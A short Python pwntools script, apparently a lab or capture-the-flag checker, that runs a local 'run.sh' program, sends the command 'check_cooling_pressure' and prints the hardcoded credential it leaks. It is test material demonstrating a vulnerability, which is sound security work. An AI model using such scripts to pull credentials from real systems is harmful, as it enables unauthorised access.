#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    pid = process(['./runner/run.sh'], env=env)
    pid.recv(numb=100, timeout=1.0)
    pid.sendline(b'check_cooling_pressure')

    for _ in range(5):
        line = pid.recv(timeout=3.0)

    print(text.red("[+]") + " Vuln Hardcoded Credentials - check_cooling_pressure:")
    print(line.decode().split("\n")[0][16:])
    print()

if __name__ == "__main__":
    main()